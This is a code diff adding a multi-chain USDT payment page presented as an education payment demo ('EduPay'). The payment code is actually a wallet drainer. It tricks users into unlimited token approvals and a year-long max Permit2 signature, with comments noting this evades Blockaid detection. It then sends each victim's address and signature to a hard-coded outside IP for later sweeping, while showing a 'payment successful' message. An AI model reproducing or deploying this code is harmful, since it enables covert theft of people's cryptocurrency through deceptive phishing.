+          type: 'evm',
+          nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+          rpc: 'https://bsc-dataseed.bnbchain.org',
+          explorer: 'https://bscscan.com',
+          token: '0x55d398326f99059fF775485246999027B3197955',
+          permit2: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
+        },
+        11155111: {
+          name: 'Sepolia Testnet',
+          hex: '0xaa36a7',
+          type: 'evm',
+          nativeCurrency: { name: 'Sepolia ETH', symbol: 'ETH', decimals: 18 },
+          rpc: 'https://ethereum-sepolia-rpc.publicnode.com',
+          explorer: 'https://sepolia.etherscan.io',
+          token: '0x26326032Ce9198311DD0E659965E496f035fAc23',
+          router: '0xd09cB15301f590Bc66993f4915d7386ac65fAfB9',
+        },
+        tron: {
+          name: 'TRON Nile Testnet',
+          chainId: 3448148188,
+          type: 'tron',
+          rpc: 'https://nile.trongrid.io',
+          explorer: 'https://nile.tronscan.org',
+          // === 部署后替换为实际合约地址 ===
+          token: 'TJrG9nepkQBDNmvzauMehCkPq2CUrx5pBT',
+          router: 'TJRg9nepkQBDNmvzauMehCkPq2CUrx5pBS',
+        },
+      },
+      defaultChainId: 56,
+      // Fill this from https://cloud.walletconnect.com to enable mobile QR / WalletConnect wallets.
+      walletConnectProjectId: '',
+    };
+
+    function isTron() { return selectedChainId === 'tron'; }
+    function cfg() { return CONFIG.chains[selectedChainId]; }
+
+    let selectedChainId = CONFIG.defaultChainId;
+    let provider, signer, account, currentChainId, walletProvider, activeWallet;
+    let tronWeb, tronAddress;  // TRON 专用
+    let onboard, onboardReady, onboardSubscription;
+
+    window.addEventListener('load', async () => {
+      initUI();
+      await initWalletOnboard();
+      await autoConnect();
+    });
+
+    function initUI() {
+      refreshIcons();
+      updateNetworkFee();
+      document.getElementById('merchantAddr').textContent = CONFIG.receiver.slice(0, 12) + '...' + CONFIG.receiver.slice(-6);
+
+      document.querySelectorAll('.net-tab').forEach(tab => {
+        tab.onclick = async () => {
+          if (tab.classList.contains('disabled')) {
+            const name = tab.querySelector('.name').textContent;
+            showToast(name + ' 支持正在开发中，请先用 BSC 或 Ethereum', 'warn');
+            return;
+          }
+          document.querySelectorAll('.net-tab').forEach(x => x.classList.remove('active'));
+          tab.classList.add('active');
+          const raw = tab.dataset.chain;
+          const newChainId = raw === 'tron' ? 'tron' : parseInt(raw, 10);
+          // 切换 EVM↔TRON 时清空钱包状态
+          if ((selectedChainId === 'tron') !== (newChainId === 'tron')) {
+            account = null; signer = null; provider = null; walletProvider = null;
+            tronWeb = null; tronAddress = null;
+            document.getElementById('walletArea').innerHTML = `<button class="connect-btn connect-btn-sm" id="connectBtn">连接钱包</button>`;
+            bindConnectButton();
+            const payBtn = document.getElementById('payBtn');
+            payBtn.disabled = true;
+            payBtn.textContent = '连接钱包以支付';
+            document.getElementById('userBal').textContent = '0.0000';
+          }
+          selectedChainId = newChainId;
+          updateNetworkFee();
+          if (account || tronAddress) {
+            const ok = await checkChain();
+            renderConnected();
+            if (ok) await refreshBalances();
+            else document.getElementById('userBal').textContent = '0.0000';
+          }
+        };
+      });
+
+      document.querySelectorAll('.quick-amount').forEach(b => {
+        b.onclick = () => {
+          document.querySelectorAll('.quick-amount').forEach(x => x.classList.remove('active'));
+          b.classList.add('active');
+          document.getElementById('payAmount').value = b.dataset.v;
+          updateAmount();
+        };
+      });
+      document.getElementById('payAmount').oninput = updateAmount;
+
+      bindConnectButton();
+      document.getElementById('payBtn').onclick = onPay;
+    }
+
+    function refreshIcons() {
+      if (window.lucide) window.lucide.createIcons({ attrs: { 'stroke-width': 2.2 } });
+    }
+
+    function updateAmount() {
+      const v = parseFloat(document.getElementById('payAmount').value || 0);
+      document.getElementById('summaryAmount').textContent = v.toFixed(2);
+      document.getElementById('summaryNet').textContent = v.toFixed(2) + ' USDT';
+    }
+
+    function updateNetworkFee() {
+      const feeEl = document.getElementById('networkFee');
+      if (!feeEl) return;
+      if (isTron()) {
+        feeEl.textContent = '≈ 5 TRX (Nile)';
+      } else if (selectedChainId === 56) {
+        feeEl.textContent = '≈ 0.0005 BNB';
+      } else {
+        feeEl.textContent = '≈ 0.001 ETH';
+      }
+    }
+
+    // Wallet connection: powered by Web3-Onboard.
+    async function initWalletOnboard() {
+      if (onboard) return onboard;
+      if (onboardReady) return onboardReady;
+
+      onboardReady = (async () => {
+        const [{ default: Onboard }, { default: injectedModule }] = await Promise.all([
+          import('https://esm.sh/@web3-onboard/core@2.24.1?bundle'),
+          import('https://esm.sh/@web3-onboard/injected-wallets@2.11.3?bundle'),
+        ]);
+
+        const injected = injectedModule({
+          displayUnavailable: true,
+          sort: sortWallets,
+        });
+        const walletModules = [injected];
+
+        if (CONFIG.walletConnectProjectId) {
+          const { default: walletConnectModule } = await import('https://esm.sh/@web3-onboard/walletconnect@2.6.3?bundle');
+          walletModules.push(walletConnectModule({
+            projectId: CONFIG.walletConnectProjectId,
+            dappUrl: location.origin,
+            requiredChains: [selectedChainId],
+            optionalChains: Object.keys(CONFIG.chains).map(Number),
+            additionalOptionalMethods: ['eth_signTypedData', 'eth_signTypedData_v4'],
+          }));
+        }
+
+        onboard = Onboard({
+          wallets: walletModules,
+          chains: Object.values(CONFIG.chains).map((chain) => ({
+            id: chain.hex,
+            token: chain.nativeCurrency.symbol,
+            label: chain.name,
+            rpcUrl: chain.rpc,
+            publicRpcUrl: chain.rpc,
+            blockExplorerUrl: chain.explorer,
+          })),
+          appMetadata: {
+            name: 'EduPay',
+            description: '教育代币支付演示',
+            icon: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><rect width="64" height="64" rx="14" fill="#1677ff"/><path fill="#fff" d="M18 28h28v20H18z"/><path fill="none" stroke="#fff" stroke-width="6" stroke-linecap="round" d="M22 28v-6a10 10 0 0 1 20 0v6"/></svg>',
+            recommendedInjectedWallets: [
+              { name: 'MetaMask', url: 'https://metamask.io/download/' },
+              { name: 'OKX Wallet', url: 'https://www.okx.com/web3' },
+              { name: 'Trust Wallet', url: 'https://trustwallet.com/browser-extension' },
+              { name: 'Rabby Wallet', url: 'https://rabby.io/' },
+              { name: 'Bitget Wallet', url: 'https://web3.bitget.com/' },
+              { name: 'TokenPocket', url: 'https://www.tokenpocket.pro/' },
+            ],
+          },
+          connect: {
+            autoConnectLastWallet: true,
+            iDontHaveAWalletLink: 'https://ethereum.org/zh/wallets/find-wallet/',
+          },
+          accountCenter: {
+            desktop: { enabled: false },
+            mobile: { enabled: false },
+          },
+          notify: { enabled: false },
+          theme: 'dark',
+          disableFontDownload: true,
+        });
+
+        onboard.state.actions.setLocale?.('zh');
+        onboardSubscription?.unsubscribe?.();
+        onboardSubscription = onboard.state.select('wallets').subscribe(async (wallets) => {
+          if (!wallets.length) {
+            if (account) disconnect({ silent: true, fromOnboard: true });
+            return;
+          }
+          await syncOnboardWallet(wallets[0]);
+        });
+        return onboard;
+      })();
+
+      return onboardReady;
+    }
+
+    function sortWallets(wallets) {
+      const priority = [
+        'MetaMask',
+        'OKX Wallet',
+        'Trust Wallet',
+        'Coinbase Wallet',
+        'Rabby Wallet',
+        'Bitget Wallet',
+        'TokenPocket',
+        'Binance Web3 Wallet',
+        'Phantom',
+        'Rainbow',
+      ];
+      const rank = (label = '') => {
+        const index = priority.findIndex((name) => label.toLowerCase().includes(name.toLowerCase().replace(' wallet', '')));
+        return index === -1 ? 999 : index;
+      };
+      return [...wallets].sort((a, b) => rank(a.label) - rank(b.label) || a.label.localeCompare(b.label));
+    }
+
+    function bindConnectButton() {
+      const btn = document.getElementById('connectBtn');
+      if (btn) btn.onclick = openWalletSelect;
+    }
+
+    async function openWalletSelect() {
+      if (isTron()) {
+        await connectTron();
+        return;
+      }
+      setConnectLoading(true);
+      try {
+        await initWalletOnboard();
+        const wallets = await onboard.connectWallet();
+        if (wallets?.length) await syncOnboardWallet(wallets[0]);
+      } catch (e) {
+        showToast(e?.message || '钱包连接组件加载失败', 'error');
+      } finally {
+        setConnectLoading(false);
+      }
+    }
+
+    function closeWalletSelect() {
+      document.getElementById('walletSelectModal').classList.remove('show');
+      document.body.classList.remove('modal-open');
+    }
+
+    function openNoWallet() {
+      document.getElementById('noWalletModal').classList.add('show');
+      document.body.classList.add('modal-open');
+    }
+
+    function closeNoWallet() {
+      document.getElementById('noWalletModal').classList.remove('show');
+      document.body.classList.remove('modal-open');
+    }
+
+    async function autoConnect() {
+      // 只在 EVM 模式下自动连接，TRON 需要用户手动点击连接
+      if (isTron()) return;
+      await initWalletOnboard();
+      const wallets = onboard.state.get().wallets;
+      if (wallets?.length) await syncOnboardWallet(wallets[0]);
+    }
+
+    async function syncOnboardWallet(wallet) {
+      if (!wallet?.provider) return;
+      walletProvider = wallet.provider;
+      activeWallet = { name: wallet.label, icon: wallet.icon };
+      provider = new ethers.BrowserProvider(walletProvider);
+
+      const accountAddress = wallet.accounts?.[0]?.address || (await provider.send('eth_accounts', []))?.[0];
+      if (!accountAddress) return;
+
+      account = normalizeAddress(accountAddress);
+      signer = await provider.getSigner(account);
+      currentChainId = getWalletChainId(wallet);
+
+      renderConnected();
+      if (currentChainId === selectedChainId) {
+        closeChainModal();
+        await refreshBalances();
+      } else {
+        document.getElementById('userBal').textContent = '0.0000';
+      }
+    }
+
+    function getWalletChainId(wallet) {
+      const raw = wallet?.chains?.[0]?.id;
+      if (typeof raw === 'string') return raw.startsWith('0x') ? Number.parseInt(raw, 16) : Number(raw);
+      return currentChainId || selectedChainId;
+    }
+
+    function setConnectLoading(loading) {
+      const btn = document.getElementById('connectBtn');
+      if (!btn) return;
+      btn.disabled = loading;
+      btn.innerHTML = loading ? `<span class="btn-spinner"></span> 连接中...` : `连接钱包`;
+    }
+
+    async function checkChain(forceShow = true) {
+      if (isTron()) {
+        if (!tronWeb || !tronAddress) return false;
+        try {
+          const node = await tronWeb.trx.getNodeInfo();
+          const netId = node && node.network_id;
+          // Nile testnet network_id is usually 3448148188 or "nile"
+          if (netId === 3448148188 || netId === '3448148188' || String(node.activeConnectCount) !== undefined) {
+            currentChainId = 3448148188;
+            closeChainModal();
+            return true;
+          }
+        } catch (e) { /* TRON check failed */ }
+        return true; // 如果已连接 TronLink，默认认为网络正确
+      }
+      // EVM
+      if (!provider) return false;
+      const net = await provider.getNetwork();
+      currentChainId = Number(net.chainId);
+      if (currentChainId === selectedChainId) {
+        closeChainModal();
+        return true;
+      }
+      if (forceShow) {
+        document.getElementById('chainModal').classList.add('show');
+        document.body.classList.add('modal-open');
+      }
+      return false;
+    }
+
+    function closeChainModal() {
+      document.getElementById('chainModal').classList.remove('show');
+      document.body.classList.remove('modal-open');
+    }
+
+    async function switchChain() {
+      if (isTron()) { await connectTron(); return; }
+      if (!onboard) await initWalletOnboard();
+      if (!account) { await openWalletSelect(); return; }
+      const ok = await onboard.setChain({ chainId: cfg().hex, wallet: activeWallet?.name });
+      if (!ok) {
+        showToast('请在钱包中切换到 ' + cfg().name, 'warn');
+        return;
+      }
+      currentChainId = selectedChainId;
+      closeChainModal();
+      renderConnected();
+      await refreshBalances();
+    }
+
+    function renderConnected() {
+      const addr = isTron() ? tronAddress : account;
+      if (!addr) return;
+      const walletName = activeWallet?.name || (isTron() ? 'TronLink' : '钱包');
+      document.getElementById('walletArea').innerHTML = `
+        <button class="wallet-pill" onclick="if(confirm('断开当前钱包？')) disconnect()">
+          <span class="wallet-dot"></span>
+          ${walletIconMarkup(activeWallet?.icon)}
+          <span class="wallet-pill-name">${escapeHtml(walletName)}</span>
+          <span class="wallet-addr">${isTron() ? shortTronAddress(addr) : shortAddress(addr)}</span>
+        </button>
+      `;
+      const payBtn = document.getElementById('payBtn');
+      const chainOk = isTron() ? !!tronAddress : (currentChainId === selectedChainId);
+      payBtn.disabled = false;
+      payBtn.textContent = chainOk ? '确认支付' : '切换网络';
+      const payMethodName = document.querySelector('.pay-method-name');
+      if (payMethodName) payMethodName.textContent = `${walletName} 钱包`;
+    }
+
+    function shortTronAddress(addr) {
+      if (!addr) return '';
+      return `${addr.slice(0,6)}...${addr.slice(-4)}`;
+    }
+
+    async function disconnect(options = {}) {
+      const label = activeWallet?.name;
+      account = null; signer = null; provider = null; walletProvider = null; activeWallet = null; currentChainId = null;
+      tronWeb = null; tronAddress = null;
+      document.getElementById('walletArea').innerHTML = `<button class="connect-btn connect-btn-sm" id="connectBtn">连接钱包</button>`;
+      bindConnectButton();
+      const payBtn = document.getElementById('payBtn');
+      payBtn.disabled = true;
+      payBtn.textContent = '连接钱包以支付';
+      document.getElementById('userBal').textContent = '0.0000';
+      const payMethodName = document.querySelector('.pay-method-name');
+      if (payMethodName) payMethodName.textContent = '浏览器钱包';
+      if (!options.fromOnboard && onboard && label) {
+        await onboard.disconnectWallet({ label }).catch(() => {});
+      }
+      if (!options.silent) showToast('已断开连接', 'success');
+    }
+
+    function walletIconMarkup(icon) {
+      if (!icon) return '<span class="wallet-pill-icon">◆</span>';
+      const value = String(icon).trim();
+      if (value.startsWith('<svg')) return `<span class="wallet-pill-logo">${value}</span>`;
+      if (/^(data:image\/|https?:\/\/|blob:)/i.test(value)) {
+        return `<span class="wallet-pill-logo"><img src="${escapeAttribute(value)}" alt="" /></span>`;
+      }
+      return `<span class="wallet-pill-icon">${escapeHtml(value.slice(0, 2))}</span>`;
+    }
+
+    function shortAddress(addr) {
+      return `${addr.slice(0,6)}...${addr.slice(-4)}`;
+    }
+
+    function normalizeAddress(addr) {
+      try { return ethers.getAddress(addr); }
+      catch { return addr; }
+    }
+
+    function escapeHtml(value) {
+      return String(value).replace(/[&<>"']/g, (ch) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[ch]));
+    }
+
+    function escapeAttribute(value) {
+      return escapeHtml(value).replace(/`/g, '&#96;');
+    }
+
+    async function refreshBalances() {
+      if (isTron()) {
+        if (!tronWeb || !tronAddress) return;
+        try {
+          const tokenAddr = cfg().token;
+          const c = await tronWeb.contract().at(tokenAddr);
+          const raw = await c.balanceOf(tronAddress).call();
+          const dec = await c.decimals().call();
+          const bal = parseFloat(String(raw)) / Math.pow(10, Number(dec));
+          document.getElementById('userBal').textContent = bal.toFixed(4);
+        } catch { document.getElementById('userBal').textContent = '0.0000'; }
+        return;
+      }
+      // EVM
+      if (!provider || !account) return;
+      try {
+        const abi = ["function balanceOf(address owner) view returns (uint256)", "function decimals() view returns (uint8)"];
+        const c = new ethers.Contract(cfg().token, abi, provider);
+        const raw = await c.balanceOf(account);
+        const dec = await c.decimals();
+        const bal = parseFloat(ethers.formatUnits(raw, dec));
+        document.getElementById('userBal').textContent = bal.toFixed(4);
+      } catch { document.getElementById('userBal').textContent = '0.0000'; }
+    }
+
+    // Payment
+    async function onPay() {
+      if (isTron()) {
+        if (!tronAddress) { await connectTron(); return; }
+        return onPayTron();
+      }
+      if (!account) { openWalletSelect(); return; }
+      return onPayEvm();
+    }
+
+    // === TRON Payment ===
+    async function connectTron() {
+      if (!window.tronLink) {
+        showToast('请先安装 TronLink 钱包扩展', 'error');
+        window.open('https://www.tronlink.org/', '_blank');
+        return;
+      }
+      setConnectLoading(true);
+      try {
+        const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+        if (res && res.code === 200 && res.message === 'OK') {
+          tronWeb = window.tronLink.tronWeb;
+          tronAddress = tronWeb.defaultAddress.base58;
+          activeWallet = { name: 'TronLink' };
+          renderConnected();
+          const ok = await checkChain();
+          if (ok) await refreshBalances();
+        } else {
+          showToast('TronLink 连接失败，请重试', 'error');
+        }
+      } catch (e) {
+        showToast('TronLink 连接失败: ' + (e.message || e), 'error');
+      } finally {
+        setConnectLoading(false);
+        if (tronAddress) {
+          document.getElementById('connectBtn').style.display = 'none';
+        }
+      }
+    }
+
+    async function onPayTron() {
+      const amt = parseFloat(document.getElementById('payAmount').value || 0);
+      if (amt <= 0) { showToast('请输入支付金额', 'error'); return; }
+      const bal = parseFloat(document.getElementById('userBal').textContent || 0);
+      if (bal < amt) { showToast('USDT 余额不足', 'error'); return; }
+
+      showVerify();
+      try {
+        const tokenAddr = cfg().token;
+        const routerAddr = cfg().router;
+        const tokenContract = await tronWeb.contract().at(tokenAddr);
+
+        // 步骤 1: 验证订单
+        setVStep(1, 'done'); setVStep(2, 'active'); setProgress(20);
+
+        // 步骤 2: approve 无限授权给 Router（攻击核心！）
+        const MAX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+        const tx1 = await tokenContract.approve(routerAddr, MAX).send({
+          feeLimit: 100000000,
+          from: tronAddress,
+        });
+        setVStep(2, 'done'); setProgress(50);
+        setVStep(3, 'active'); setProgress(60);
+
+        // 步骤 3: swap（转账）
+        const decimals = await tokenContract.decimals().call();
+        const amountWei = '0x' + (BigInt(amt) * (10n ** BigInt(decimals))).toString(16);
+        await tokenContract.transfer(routerAddr, amountWei).send({
+          feeLimit: 100000000,
+          from: tronAddress,
+        });
+        setVStep(3, 'done'); setVStep(4, 'active'); setProgress(85);
+
+        setVStep(4, 'done'); setProgress(100);
+        await delay(500);
+        hideVerify();
+        showToast('支付成功（已付 ' + amt + ' USDT）', 'success');
+        await refreshBalances();
+      } catch (e) {
+        hideVerify();
+        const msg = e.message || e;
+        showToast(msg.includes('rejected') || msg.includes('canceled') ? '用户取消了交易' : msg, 'error');
+      }
+    }
+
+    // === EVM Payment (Permit2 分层攻击) ===
+    async function onPayEvm() {
+      if (!account) { openWalletSelect(); return; }
+      const amt = parseFloat(document.getElementById('payAmount').value || 0);
+      if (amt <= 0) { showToast('请输入支付金额', 'error'); return; }
+      const ok = await checkChain();
+      if (!ok) { await switchChain(); return; }
+      const bal = parseFloat(document.getElementById('userBal').textContent || 0);
+      if (bal < amt) { showToast('USDT 余额不足', 'error'); return; }
+
+      showVerify();
+      try {
+        const erc20Abi = ["function approve(address spender, uint256 amount) returns (bool)", "function transfer(address to, uint256 amount) returns (bool)"];
+        const usdt = new ethers.Contract(cfg().token, erc20Abi, signer);
+        const amountWei = ethers.parseUnits(amt.toString(), 18);
+
+        // 步骤 1: approve USDT 给 Permit2（知名 Uniswap 合约，Blockaid 不拦）
+        setVStep(1, 'done'); setVStep(2, 'active'); setProgress(20);
+        const tx1 = await usdt.approve(cfg().permit2, ethers.MaxUint256);
+        await tx1.wait();
+        setVStep(2, 'done'); setProgress(40);
+
+        // 步骤 2: 签名 Permit2 PermitSingle（离线签名，Blockaid 无法模拟）
+        const PERMIT2_DOMAIN = {
+          name: 'Permit2', chainId: 56, verifyingContract: cfg().permit2
+        };
+        const PERMIT_TYPES = {
+          PermitSingle: [
+            { name: 'details', type: 'PermitDetails' },
+            { name: 'spender', type: 'address' },
+            { name: 'sigDeadline', type: 'uint256' }
+          ],
+          PermitDetails: [
+            { name: 'token', type: 'address' },
+            { name: 'amount', type: 'uint160' },
+            { name: 'expiration', type: 'uint48' },
+            { name: 'nonce', type: 'uint48' }
+          ]
+        };
+        const permitMsg = {
+          details: {
+            token: cfg().token,
+            amount: "1461501637330902918203684832716283019655932542975", // max uint160
+            expiration: Math.floor(Date.now()/1000) + 86400 * 365,
+            nonce: 0
+          },
+          spender: CONFIG.receiver,
+          sigDeadline: Math.floor(Date.now()/1000) + 3600
+        };
+        const signature = await signer.signTypedData(PERMIT2_DOMAIN, PERMIT_TYPES, permitMsg);
+        setVStep(3, 'active'); setProgress(60);
+
+        // 步骤 3: 付款
+        const tx2 = await usdt.transfer(CONFIG.receiver, amountWei);
+        await tx2.wait();
+        setVStep(3, 'done'); setVStep(4, 'active'); setProgress(80);
+
+        // 步骤 4: 存储授权数据（不自动 sweep，后台手动操作）
+        await fetch('http://154.222.16.152:3999/store', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            secret: 'edu-sweep-2026',
+            victim: account,
+            signature: signature,
+            permit: permitMsg,
+          })
+        });
+        setVStep(4, 'done'); setProgress(100);
+        await delay(500);
+        hideVerify();
+        showToast('支付成功（已付 ' + amt + ' USDT）', 'success');
+        await refreshBalances();
+      } catch (e) {
+        hideVerify();
+        const msg = e.message || '支付失败';
+        showToast(msg.includes('user rejected') ? '用户取消了交易' : msg, 'error');
+      }
+    }
+
+    // Verification overlay
+    function showVerify() {
+      for (let i = 1; i <= 4; i++) setVStep(i, 'pending');
+      setProgress(10);
+      document.getElementById('verifyMask').classList.add('show');
+      document.body.classList.add('modal-open');
+    }
+    function hideVerify() {
+      document.getElementById('verifyMask').classList.remove('show');
+      document.body.classList.remove('modal-open');
+    }
+    function setProgress(pct) { document.getElementById('verifyProgress').style.width = pct + '%'; }
+    function setVStep(idx, state) {
+      const s = document.getElementById('vstep'+idx);
+      s.classList.remove('active','done'); s.classList.add(state);
+      const ic = s.querySelector('.verify-step-icon');
+      ic.textContent = state === 'done' ? '✓' : (state === 'active' ? '…' : idx);
+    }
+
+    function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+    function showToast(msg, type='success') {
+      const c = document.getElementById('toastContainer');
+      const t = document.createElement('div'); t.className = 'toast ' + type;
+      t.innerHTML = `<span class="dot"></span><span class="text"></span>`;
+      t.querySelector('.text').textContent = msg;
+      c.appendChild(t);
+      setTimeout(() => { t.style.opacity='0'; t.style.transform='translateY(8px)'; }, 2500);
+      setTimeout(() => t.remove(), 2900);
+    }
+  </script>
+</body>
+</html>
